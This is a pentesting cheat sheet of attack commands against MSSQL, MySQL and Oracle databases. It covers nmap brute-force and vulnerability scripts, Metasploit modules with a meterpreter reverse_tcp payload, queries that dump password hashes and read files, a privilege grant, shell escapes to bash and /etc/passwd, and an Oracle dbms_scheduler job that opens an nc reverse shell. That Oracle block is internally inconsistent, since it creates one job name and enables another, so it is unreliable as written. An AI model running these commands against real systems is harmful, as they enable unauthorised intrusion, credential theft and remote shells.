# Target database 

> Port List 

- MSSQL:    
- MYSQL:    3306 
- Oracle:   1521 

## Summary 



## MSSQL


> nmap 

    nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156

> Bruteforce MSSQL Login

    use auxiliary/admin/mssql/mssql_enum

> MSSQL Credential Scanner

    use auxiliary/scanner/mssql/mssql_login
> Msf exploit

    msf > use exploit/windows/mssql/mssql_payload
    msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp

## MYSQL 

> nmap Vuln scan

    nmap -sV -Pn -vv  TARGET_IP -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

> MYSQL Version

    use auxiliary/scanner/mysql/mysql_version

> Mysql client 

    mysql -h TARGET_IP
    mysql -h TARGET_IP -u root
    mysql -h TARGET_IP -u root@localhost
    mysql -h TARGET_IP -u ""@localhost
> To run many sql commands at once

    mysql -u username -p < manycommands.sql
> Command History

    cat ~/.mysql.history

### Querys
> Enum 

```SQL
select version();
select user();
select database();
```

> DB user Info 
```SQL
SELECT user,password, file_priv FROM mysql.user;
```
> Read file 
```SQL
SELECT LOAD_FILE('FILENAME');
```
> Create a new user and grant him privileges

```SQL
mysql> create user test identified by 'test';
mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```
> Break into a shell

    mysql> \! cat /etc/passwd
    mysql> \! bash
## Oracle 

> Install 

    yay tnscmd10g

> Status 

    tnscmd10g status -h TARGET_IP
> Fingerprint Oracle TNS Version

    tnscmd10g version -h TARGET_IP
    nmap --script=oracle-tns-version TARGET_IP

> Brute

    nmap --script=oracle-sid-brute TARGET_IP
    nmap --script=oracle-brute TARGET_IP
> Oscanner

    oscanner -s TARGET -P 1521 

### Querys 

```SQL
SELECT * FROM session_privs; 
SELECT PASSWORD FROM DBA_USERS; 
```

> Get Oracle Reverse os-shell


```SQL
begin
dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET_IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end; 
```

## Source 


https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/

http://www.0daysecurity.com/penetration-testing/enumeration.html